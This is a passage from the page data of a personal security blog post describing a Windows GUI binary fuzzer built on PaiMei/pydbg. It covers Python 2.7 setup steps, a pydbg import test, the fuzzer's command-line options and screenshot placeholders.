class=\"token keyword\">as</span> _ctypesStructure       <span class=\"token comment\"># Add for Paimei</span>\n<span class=\"token keyword\">from</span> struct <span class=\"token keyword\">import</span> calcsize <span class=\"token keyword\">as</span> _calcsize\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Structure</span> <span class=\"token punctuation\">(</span>_ctypesStructure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">pass</span>                <span class=\"token comment\"># Add for Paimei</span>\n\n<span class=\"token keyword\">if</span> __version__ <span class=\"token operator\">!=</span> _ctypes_version<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"Version number mismatch\"</span><span class=\"token punctuation\">,</span> __version__<span class=\"token punctuation\">,</span> _ctypes_version<span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>For compatibility with python 2.7.x version, modify the <strong>init</strong>.py file.</li>\n</ul>\n<p><code class=\"language-text\">PATH: C:\\Python27\\Lib\\ctypes\\**init**.py</code></p>\n<ul>\n<li>If you added the code in lines 17 and 19, download the rebuilt pydasm.pyd file for Python 2.7.x.</li>\n<li>After that, copy it to the C:\\Python27\\Lib\\site-packages\\pydbg folder.</li>\n</ul>\n<p>If there is an existing pydasm.pyd file, it will be overwritten.</p>\n<ul>\n<li><a href=\"https://vallhalla-edition.tistory.com/attachment/cfile27.uf@99B4814F5C98AB6A29F4DB.pyd\">pydasm.pyd</a></li>\n</ul>\n<p><strong>pydasm test</strong></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> pydbg\n<span class=\"token keyword\">print</span> <span class=\"token string\">\"Hello, pydbg!\"</span></code></pre></div>\n<ul>\n<li>success!</li>\n</ul>\n<h2 id=\"options-cli\" style=\"position:relative;\"><a href=\"#options-cli\" aria-label=\"options cli permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options (CLI)</h2>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">-</span>t<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>target <span class=\"token punctuation\">:</span> Binary to fuzz\n<span class=\"token operator\">-</span>s<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span>sample <span class=\"token punctuation\">:</span> Sample folder name <span class=\"token punctuation\">(</span>Test Case <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">-</span>h<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token builtin\">help</span> <span class=\"token punctuation\">:</span> <span class=\"token builtin\">help</span></code></pre></div>\n<h2 id=\"blueprint-gui\" style=\"position:relative;\"><a href=\"#blueprint-gui\" aria-label=\"blueprint gui permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>BluePrint (GUI)</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACoElEQVQoz2XM+0tTARjG8fOXRESJupbToW66s7a57ezsKBYzm23ulmULF5mlJWkX7YK0bmqNLrSuphSDoDQoiCiqfyCJLlQk9EsFRYVt53zDzaLLDx/e93leeAXX2e84TnzAdvwdSuor0TOgjIEyDvUTfxgvaJgo3LxX542BfBHkC1p+Cs7uDM74MO7RTzQOzODrm8bT9QwxPo15/VNM/5jrxI1PsXc8x9XzhNCu+yhnNJQ0eM9pCN6OFA3BrbiTM1TYAuiW6NDrzUh2O8EVTkIr/zbXSXYH5QaR0iU6FhtkrMdziCPgOqkhtPacJtG9AyU5Q7mjBV1JEfoKC32JJh6cDvDqepiZGxFeZyK8yUTg8TomklEMpjrMpmoOj6ZJ3ftK+nGO9jEN4faVNB/v9BMefY/e2oK+pJhiQw1H4n6+ndrAy2QbL5JtvD26jumhNri4kSs7YhgtEqbKKhLd+9g+/oX+TJbgWQ1haPgR14ZvsnroE2VWP3pdKcZqkVCzn55YhM7WAN2xCNuiYbpCQTYHA0Saw9S5Gig3lFFkVBAHs1j2gfOgimDbDaY+sO3MsszsY5lez3Kbm0bfGup9QRRfgIamVhpXh1F8QeqbAvhWrcXmUNDpllIhNiPvmcU7CPKAiuDbk+P85GfStz4wkrqER65n4aISKivNWGqqqDVXYl9uwemw5ndLTTW1NdUYjQZKihZQViUjbZ/F0wueXhVB6lRp258lOviD4cuvSZ2/y4FjGboGbmHxTyG2TCH6p7D4Jwv7b7extkxiCz1E6swhbdGY+yVE+jVc7RpiDNr3avSPqOw+CVsOgacD5AR4NxX8yn+a66S4hhRX81NoSmjIa1WkmIotqFLrL7CuyeGOZPOkaIFrPv8nquKOank/AVcrGqV8PVvaAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./Bl-8.png\"\n        title=\"./Bl-8.png\"\n        src=\"/static/11b0973c52b4a1db5dee5094314f7265/37523/Bl-8.png\"\n        srcset=\"/static/11b0973c52b4a1db5dee5094314f7265/e9ff0/Bl-8.png 180w,\n/static/11b0973c52b4a1db5dee5094314f7265/f21e7/Bl-8.png 360w,\n/static/11b0973c52b4a1db5dee5094314f7265/37523/Bl-8.png 720w,\n/static/11b0973c52b4a1db5dee5094314f7265/302a4/Bl-8.png 1080w,\n/static/11b0973c52b4a1db5dee5094314f7265/07a9c/Bl-8.png 1440w,\n/static/11b0973c52b4a1db5dee5094314f7265/29114/Bl-8.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB8ElEQVQoz3XMS09TQRjG8fPFlF7onJkWiYTKVS4FTEtFAkVMwMICatU2kZ6Woi2KFbysTEzcmLDxQ7jXGKPRaGShiGln/oSeA0kFF7887zt5n7FCD/fxFz8TKH3B73zCX/hI29p7VOk7sXKdjpomvP0vg9oBtWM8nLBU5i0dSy+R1V9EtiFcg8gTEDXwPYbAkVqr9hqoLYPa4hTr7sorni6WiJZ+IDYhXNGIKvRX/pCs7BG//5OE8424Z9L5yuj6HqoKqmpOsaZzH0hn33GxdIDcgEi5QbAKUwuv2RgeZ23kGoXoKM6lGE7vBOXuQdITd5q3qsl46bJ863CuDHYRVNGgCnXUAwglt+gMt9HZ1cXA8BA9A/2IsELYPgJ9c0jHu3eMmx5L5RqEcw1kXiPzBpmrI9dAzOwioinae9P0JYuMzG4S7LlJsHsOeeURkXt4Ha/nseSKQa5o3DymkRmQWZd9C4S3K8+FrCaS0ajV1r4lFw2ttJsLDeRC3UuX3dzr+K838M9D8AYE5lv7VnBaI2YN9pl0q5QmNKPJP9c8e/ObF7v73N4xHP0hUwY7ZbBiy4bIlEEkDPbkGRIGlTTIpDuLhGZsWZNcPeBq5i+jSxoR1yf3VnTKIMcNIvZ/csx1NNsxg++y4fwgTf4h9+349hDx2VedtFeB6QAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./Bl-10.png\"\n        title=\"./Bl-10.png\"\n        src=\"/static/5f2de169ea7d484f5fa5123a55f7ff56/37523/Bl-10.png\"\n        srcset=\"/static/5f2de169ea7d484f5fa5123a55f7ff56/e9ff0/Bl-10.png 180w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/f21e7/Bl-10.png 360w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/37523/Bl-10.png 720w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/302a4/Bl-10.png 1080w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/07a9c/Bl-10.png 1440w,\n/static/5f2de169ea7d484f5fa5123a55f7ff56/29114/Bl-10.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACp0lEQVQoz0WOW28TVxRG5z9VQm1DZ+w5c86ZOeOxPa4bG8eJ4wQIhFzUpLSmVFwCCaSAUMtFUC4CqQakQoGqJFWkPvUJ8YhUqQFFlaB9QyoU0QZ7vFBMgIelb+29pU/bkhf+wz39hNS3j4nOrVI/D+EVMNfeEVwFfx19BcJrIJsw8xtcv79K895Tztx9Sfg9WGLnLbyRE6gzz8h8/YTiV7+T+WIZd3wZMbmMmPgDPbWCmX6MmXpE3PibQuMRwfSfbNr3gF3H7jBy+V8GfgBzsYMVTp4iU5tAn3xKT/Uo6Q9sHCeD81GAYxscW6HFAFvcW+xO3eS0vsFxcQKRinBFjpSIcWZXkOcgOJtgVcauMjU4Q+b4czbWjvJJIYcM8ghl8FSIkAEmyhMXy5goRuoMQhrSwsf1fOy0Rs4+JDwLwakEa772PwvxP5SOwIfVeXoLMSqIcb2wi9IRHxcrDAxuIZvvxTd5dJBbvxuEilAHVghOQvBNgrV5ssXw9jZmHnpKcxR9RU7n8GSIK0OkCskXStSHt3WL18relGo/i17zPSv4x8A/0saSswl6roU5BHbvPL6SyKCA62VwZURaGHKFMvXhUXrLNbL5Etm4TDZfRgf57qdB4yFmFoKZNpa/KyE91cZtwIZwBrvnPZRWSE8gpUC4KcLQp9pXJo6zRJHpYoyP5wk2vO/gjD4g/TmoRhtLfdrhu9ttLt15QfPHu0zv/wmnb4lo66/IgUW8/gXc6s+I/oWu+0NL6PovpCqLDO1c5HLzNhdu/kVzKaG0J8Ea2tthbC5h674XjB+CypcgtoHe8Q5/7DVrrkZfp9wOhc9g/DCM7F9lx8EW2YkOVnGsQ7q/g9MHdiXB7W+h6y3UYAu1nmuzfuvttzuv1sKutHGqYPd1kIMJrwBIUhS7ZfuiggAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./Bl-9.png\"\n        title=\"./Bl-9.png\"\n        src=\"/static/ddefedaf5616ff75bb74313a97d51243/37523/Bl-9.png\"\n        srcset=\"/static/ddefedaf5616ff75bb74313a97d51243/e9ff0/Bl-9.png 180w,\n/static/ddefedaf5616ff75bb74313a97d51243/f21e7/Bl-9.png 360w,\n/static/ddefedaf5616ff75bb74313a97d51243/37523/Bl-9.png 720w,\n/static/ddefedaf5616ff75bb74313a97d51243/302a4/Bl-9.png 1080w,\n/static/ddefedaf5616ff75bb74313a97d51243/07a9c/Bl-9.png 1440w,\n/static/ddefedaf5616ff75bb74313a97d51243/29114/Bl-9.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#fuzzer-tool\">Fuzzer tool</a></li>\n<li><a href=\"#required-installation\">Required installation</a></li>\n<li><a href=\"#options-cli\">Options (CLI)</a></li>\n<li><a href=\"#blueprint-gui\">BluePrint (GUI)</a></li>\n</ul>\n</div>","frontmatter":{"date":"December 20, 2020","title":"Development of window GUI binary fuzzing using the dump fuzzing theory.","categories":"projects","author":"Zer0Luck","emoji":"🔎"},"fields":{"slug":"/project_fuzz_/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/cve_2012_0002_1-day/","nextSlug":"/sstf2020_t_express_ctf_writeup/","prevSlug":"/project_fuzz_/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}